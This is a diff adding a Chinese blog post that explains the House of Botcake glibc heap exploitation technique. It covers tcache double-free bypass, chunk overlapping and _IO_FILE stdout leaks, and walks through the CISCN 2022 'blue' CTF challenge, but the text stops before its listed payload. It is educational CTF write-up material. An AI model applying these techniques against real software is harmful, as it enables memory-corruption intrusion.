@@ -1,0 +1,739 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="true"
+  >
+  <head>
+  <meta charset="utf-8">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'true');
+  </script>
+
+    <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "true");
+  </script>
+
+    <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"我是复制糕手!(*^▽^*)!"},"fail":{"zh-CN":"一拳一个不让复制![○･｀Д´･ ○]"},"copyright":{"enable":true,"count":50,"license_type":"by-nc-sa","content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};window.REIMU_CONFIG.anchor_icon = 'f2dc';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://FallingDusky.github.io';window.REIMU_CONFIG.relative = '/';</script>
+  <title>
+    House of Botcake | Dusk的怪东西
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/regular.min.css" integrity="sha384-4qYppzjH8EiA+cGdaubu2vL7Rk8WGiqCSj7oRuP1uwtFWkfKNHD20lPfcrbQc8dU" crossorigin="anonymous">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/solid.min.css" integrity="sha384-wbMWab3UDSPm2kvIgVOn&#x2F;d9KPTecgPU1+Nb3zoQrm&#x2F;oVu0EkPL6IaKinjbwW0rum" crossorigin="anonymous">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css" crossorigin="anonymous">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/brands.min.css" integrity="sha384-KTGeC2hIMzpeQakhsmzB9bZfhCD5xZZCgI1iZH6f/O457SxzlkzTQg/WXFNoi3ih" crossorigin="anonymous">
+<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v5-font-face.min.css" integrity="sha384-nJ1ThfldViXoLpJ6jlKcP2beas8BMbYq26SG9Hi8cH89bZi4RZ644v7helMCqJxd" crossorigin="anonymous">
+<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v4-font-face.min.css" integrity="sha384-UlkrhOIvZxJFd4MElSUp7ow6/RUeYKi/orfCZIRRiOENFuQPIAA3T3HjYfmBRhNq" crossorigin="anonymous">
+<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" integrity="null" crossorigin="anonymous">
+<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" integrity="null" crossorigin="anonymous">
+<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" integrity="null" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="堆的House of Botcake攻击手法，实现double free">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of Botcake">
+<meta property="og:url" content="https://fallingdusky.github.io/2024/05/24/House%20of%20Botcake/index.html">
+<meta property="og:site_name" content="Dusk的怪东西">
+<meta property="og:description" content="堆的House of Botcake攻击手法，实现double free">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/aQXHVK592xLrtWY.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/D43g8W1s6zGFQpP.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/fM8sv6nZ2tyWNqo.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/cGuik9evCg7MNtR.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/B9ovWnp7ljacRmy.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/guKBtbGMJZFxUXc.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/2E5ltOuKRbLCBWT.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/FsmwGODVPE1t5di.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/rYXMT5xh7H42mLN.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/34XYnFa7QJ9NjpU.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/QYEphCRu2Sc79ML.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/XsiC4kBeJyFgKr2.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/WGtxqy9jZOc38Hu.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/UR6bj8MdyohkZ2O.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/ILzpjBrD2vgsC6f.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/Kp1GAd2DioMVXEt.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/yM59vKfJHLlADwW.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/sLmuvCORFb1eY9M.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/ZLnIQCH67a9toM2.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/02/cfmaijwQTeP1Z65.png">
+<meta property="article:published_time" content="2024-05-24T14:19:00.000Z">
+<meta property="article:modified_time" content="2024-12-02T13:29:38.198Z">
+<meta property="article:author" content="Dusk">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/12/02/aQXHVK592xLrtWY.png">
+    <link rel="alternate" href="/atom.xml" title="Dusk的怪东西" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="null" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj+vDDLIL+xBGQU/voDBY5XE2lVh" crossorigin="anonymous">
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">格林...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon ">
+                  &#xf2dc;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon ">
+                  &#xf2dc;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon ">
+                  &#xf2dc;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon ">
+                  &#xf2dc;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="House of Botcake">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">House of Botcake</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+      <meting-js
+        theme="var(--color-link)"
+        id="18008603509"
+        server="netease"
+        type="playlist"
+        
+        fixed="false"
+        autoplay="false"
+        loop="all"
+        order="list"
+        preload="auto"
+        volume="0.7"
+        mutex="true"
+        list-folded="false"
+        lrc-type="0"
+      ></meting-js>
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text"> 个人理解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-botcake"><span class="toc-number">2.</span> <span class="toc-text"> House of Botcake</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#_io_file"><span class="toc-number">2.1.</span> <span class="toc-text"> _IO_FILE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#_flag%E8%AF%A6%E6%83%85"><span class="toc-number">2.1.2.</span> <span class="toc-text"> _flag详情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text"> 大致思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98ciscn-2022-%E5%8D%8E%E4%B8%9C%E5%8C%97blue"><span class="toc-number">2.4.</span> <span class="toc-text"> 例题：[CISCN 2022 华东北]blue</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">2.4.1.1.</span> <span class="toc-text"> main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">2.4.1.2.</span> <span class="toc-text"> add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete"><span class="toc-number">2.4.1.3.</span> <span class="toc-text"> delete</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show"><span class="toc-number">2.4.1.4.</span> <span class="toc-text"> show</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#only_uaf"><span class="toc-number">2.4.1.5.</span> <span class="toc-text"> only_UAF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.4.2.</span> <span class="toc-text"> 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E8%B0%83"><span class="toc-number">2.4.3.</span> <span class="toc-text"> 动调</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload"><span class="toc-number">3.</span> <span class="toc-text"> Payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text"> 总结</span></a></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">16</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/FallingDusky itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-instagram sidebar-social-icon">
+      <a href=https://www.instagram.com/xi_luo_san itemprop="url" target="_blank" aria-label="instagram" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf2dc;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf2dc;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf2dc;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf2dc;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-House of Botcake" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2024-05-24T14:19:00.000Z" itemprop="datePublished">2024-05-24</time>
+    <time style="display: none;" id="post-update-time">2024-12-02</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <div class="warning custom-block" id="outdate-blockquote" style="display: none;">
+          <p class="custom-block-title">WARNING</p>
+          <p></p>
+        </div>
+        <h1 id="个人理解"><a class="markdownIt-Anchor" href="#个人理解"></a> 个人理解</h1>
+<p>感觉House of Botcake就是<strong>double free + overlapping + _IO_FILE attack</strong>的结合使用，需要<strong>对堆结构有着较为详细的理解</strong>，也要有能管理堆顺序的能力，建议写题的时候还是<strong>标一标堆的index</strong>，这样在利用堆的时候会比较方便些</p>
+<h1 id="house-of-botcake"><a class="markdownIt-Anchor" href="#house-of-botcake"></a> House of Botcake</h1>
+<p>想要利用这个攻击，我们得<strong>先了解_IO_FILE的结构</strong></p>
+<h2 id="_io_file"><a class="markdownIt-Anchor" href="#_io_file"></a> _IO_FILE</h2>
+<h3 id="结构"><a class="markdownIt-Anchor" href="#结构"></a> 结构</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdout</span><br><span class="line">$3 =(FILE *)0x7f8aba48f760 &lt; I0 2 1 stdout &gt;</span><br><span class="line">pwndbg&gt; ptype stdout</span><br><span class="line">type = struct IO FILE &#123;</span><br><span class="line">int flags; #flag得记得伪造</span><br><span class="line">char * Io read ptr;</span><br><span class="line">char * Io read end;</span><br><span class="line">char * I0 read base,</span><br><span class="line">char * I0 write base; #这三个write是我们攻击中的核心部分</span><br><span class="line">char * I0 write ptr;</span><br><span class="line">char * I0 write end;</span><br><span class="line">char * Io buf base;</span><br><span class="line">char * Io buf end;</span><br><span class="line">char * I0 save base;</span><br><span class="line">char * I0 backup base;</span><br><span class="line">char * I0 save end;</span><br><span class="line">struct I0 marker * markers;</span><br><span class="line">struct IO FILE * chain;</span><br><span class="line">int fileno;</span><br><span class="line">int flags2;</span><br><span class="line">off t old offset;</span><br><span class="line">unsigned short cur column;</span><br><span class="line">signed char vtable offset;</span><br><span class="line">char shortbuf[1l;</span><br><span class="line">I0 lock t * lock;</span><br><span class="line">off64 t offset;</span><br><span class="line">struct</span><br><span class="line">I0 codecvt * codecvt;</span><br><span class="line">struct Io wide data * wide data;</span><br><span class="line">struct</span><br><span class="line">IO FILE * freeres list;</span><br><span class="line">void * freeres buf;</span><br><span class="line">size tpad5;</span><br><span class="line">int mode;</span><br><span class="line">char unused2[20];</span><br><span class="line">&#125; *</span><br></pre></td></tr></table></figure>
+<h3 id="_flag详情"><a class="markdownIt-Anchor" href="#_flag详情"></a> _flag详情</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_MAGIC 0xFBAD0000 /* Magic number */</span><br><span class="line">#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */</span><br><span class="line">#define _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="line">#define _IO_USER_BUF 1 /* User owns buffer; don&#x27;t delete it on close. */</span><br><span class="line">#define _IO_UNBUFFERED 2</span><br><span class="line">#define _IO_NO_READS 4 /* Reading not allowed */</span><br><span class="line">#define _IO_NO_WRITES 8 /* Writing not allowd */</span><br><span class="line">#define _IO_EOF_SEEN 0x10</span><br><span class="line">#define _IO_ERR_SEEN 0x20</span><br><span class="line">#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&#x27;t call close(_fileno) on cleanup. */</span><br><span class="line">#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/</span><br><span class="line">#define _IO_IN_BACKUP 0x100</span><br><span class="line">#define _IO_LINE_BUF 0x200</span><br><span class="line">#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */</span><br><span class="line">#define _IO_CURRENTLY_PUTTING 0x800</span><br><span class="line">#define _IO_IS_APPENDING 0x1000</span><br><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line">#define _IO_BAD_SEEN 0x4000</span><br><span class="line">#define _IO_USER_LOCK 0x8000</span><br></pre></td></tr></table></figure>
+<p>我们需要关注的只有三个，<strong>_IO_MAGIC 0xFBAD0000,_IO_IS_APPENDING 0x1000,_IO_CURRENTLY_PUTTING</strong>,通常情况下_flag为0xfbad2887，而我们攻击的时候常常需要<strong>把_flag修改为0xfbad1800</strong>，这正好对应这三个flag值</p>
+<h3 id="解释"><a class="markdownIt-Anchor" href="#解释"></a> 解释</h3>
+<p>为什么要这样设置呢？</p>
+<p>首先，我们在这种攻击方式下，用的基本是puts函数，puts函数会经历以下函数调用<br />
+<code>puts-&gt;_IO_file_xsputn-&gt;_IO_file_overflow-&gt;_IO_do_write</code></p>
+<p>下面我来详细解释下这些flag值的作用</p>
+<p>当<code>_IO_CURRENTLY_PUTTING=0x800时</code>通常表示当前文件流正在<strong>进行写入操作</strong>。</p>
+<p><code>IO_IS_APPENDING=0x1000</code>表示文件流<strong>是否以追加模式打开</strong>。</p>
+<p><code>IO_MAGIC=0xFBAD0000</code>表示**_IO_FILE结构是有效的**</p>
+<p>在_IO_FILE有效的情况下，因为我们以追加模式进行写入操作，如果我们把<code>_IO_write_base，_IO_write_ptr</code>分别设置为<strong>想要泄露的地方，结束泄露的地址</strong>，我们就可以<strong>通过environ函数的存在泄露出栈地址</strong>，从而获得当前函数的返回地址，进行一系列操作</p>
+<h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2>
+<p>在libc大于2.27版本之后，为了防止tcache攻击过于简单而引入了<strong>tcache_key</strong>，对应的位置是<strong>堆块的bk</strong>。当堆块被free进入tcache_bin后，<strong>如果遍历该大小的tcache_bin发现有相同地址的堆块就会触发double_free警告，从而被killed掉</strong><br />
+而House of Botcake，充分利用了这一机制，如果将同一堆块<strong>一次free进unsorted_bin</strong>里（没有key），<strong>一次free进tcache_bin里</strong>，是不是就绕过检查了呢？这样就让double_free再度成为可能</p>
+<h2 id="大致思路"><a class="markdownIt-Anchor" href="#大致思路"></a> 大致思路</h2>
+<p>先申请十个堆块，然后一如既往填满tcache先，第十个堆块用来防止与top chunk合并</p>
+<p><img src="https://s2.loli.net/2024/12/02/aQXHVK592xLrtWY.png" alt="image" /></p>
+<p>接着再free第九个堆块(index=8)，使它进入unsorted_bin</p>
+<p><img src="https://s2.loli.net/2024/12/02/D43g8W1s6zGFQpP.png" alt="image" /></p>
+<p>此时完成了把目标堆块扔进unsorted_bin里，但我们还需要再free第八个堆块，此时会<strong>触发chunk合并</strong></p>
+<p><img src="https://s2.loli.net/2024/12/02/fM8sv6nZ2tyWNqo.png" alt="image" /></p>
+<p><img src="https://s2.loli.net/2024/12/02/cGuik9evCg7MNtR.png" alt="image" /></p>
+<p>这种攻击方法常常需要<strong>修改fd指针</strong>来达成我们需要的操作，我们目标堆块尾地址为720，为了控制到该堆块，我们先申请一个多余堆块给目标堆块腾位置</p>
+<p><img src="https://s2.loli.net/2024/12/02/B9ovWnp7ljacRmy.png" alt="image" /></p>
+<p>接着我们再次free第九个堆块，实现double_free</p>
+<p><img src="https://s2.loli.net/2024/12/02/guKBtbGMJZFxUXc.png" alt="image" /></p>
+<p>此时我们完成了我们的目的，实现了double_free，接下来就是<strong>切割unsorted_bin的堆块</strong>了，这里我选择切割0x70的堆块</p>
+<p><img src="https://s2.loli.net/2024/12/02/2E5ltOuKRbLCBWT.png" alt="image" /></p>
+<p>那么下次我们再申请出0x70的堆块时，<strong>data域就是710，对应720的prev和size</strong>，我们就可以轻而易举操控fd啦。后续还可接着free这两个堆块进行长久地fd指针修改，进行任意操作，整个流程差不多如此。</p>
+<h2 id="例题ciscn-2022-华东北blue"><a class="markdownIt-Anchor" href="#例题ciscn-2022-华东北blue"></a> 例题：[CISCN 2022 华东北]blue</h2>
+<h3 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计"></a> 代码审计</h3>
+<h4 id="main"><a class="markdownIt-Anchor" href="#main"></a> main</h4>
+<p>为了方便，我把去符号表的函数名都修改为了对应的功能函数名</p>
+<p><img src="https://s2.loli.net/2024/12/02/FsmwGODVPE1t5di.png" alt="image" /></p>
+<h4 id="add"><a class="markdownIt-Anchor" href="#add"></a> add</h4>
+<p><img src="https://s2.loli.net/2024/12/02/rYXMT5xh7H42mLN.png" alt="image" /></p>
+<h4 id="delete"><a class="markdownIt-Anchor" href="#delete"></a> delete</h4>
+<p><img src="https://s2.loli.net/2024/12/02/34XYnFa7QJ9NjpU.png" alt="image" /></p>
+<p>把指针置空了，没有UAF漏洞</p>
+<h4 id="show"><a class="markdownIt-Anchor" href="#show"></a> show</h4>
+<p><img src="https://s2.loli.net/2024/12/02/QYEphCRu2Sc79ML.png" alt="image" /></p>
+<p>只有一次show的机会</p>
+<h4 id="only_uaf"><a class="markdownIt-Anchor" href="#only_uaf"></a> only_UAF</h4>
+<p><img src="https://s2.loli.net/2024/12/02/XsiC4kBeJyFgKr2.png" alt="image" /></p>
+<p>同样，也只有一次UAF的机会</p>
+<h3 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h3>
+<p>这个题比较特殊，只有一次UAF和show的机会，所以我们只能<strong>把UAF和show作用于泄露libc</strong>，这样就可以找到_IO_2_1_stdout_，<strong>利用House of Botcake将_IO_FILE的_IO_write_base和_IO_write_ptr修改为environ，environ+8</strong>，通过<strong>puts泄露add的栈地址</strong>，从而获得ret的地址。再次free目标堆块和辅助堆块，再次通过House of Botcake<strong>修改目标堆块的fd为add_ret地址</strong>，申请到栈上的同时往栈布置orw链即可</p>
+<h3 id="动调"><a class="markdownIt-Anchor" href="#动调"></a> 动调</h3>
+<p>许多步骤和之前是一样的，我就不重复演示了，直接从切割0x70chunk开始</p>
+<p><img src="https://s2.loli.net/2024/12/02/WGtxqy9jZOc38Hu.png" alt="image" /></p>
+<p>可以看到，我们已经<strong>把目标chunk的fd修改成了stdout</strong>，我们再申请进去后<strong>修改它的结构为environ即可在puts泄露栈地址</strong></p>
+<p><img src="https://s2.loli.net/2024/12/02/UR6bj8MdyohkZ2O.png" alt="image" /></p>
+<p><img src="https://s2.loli.net/2024/12/02/ILzpjBrD2vgsC6f.png" alt="image" /></p>
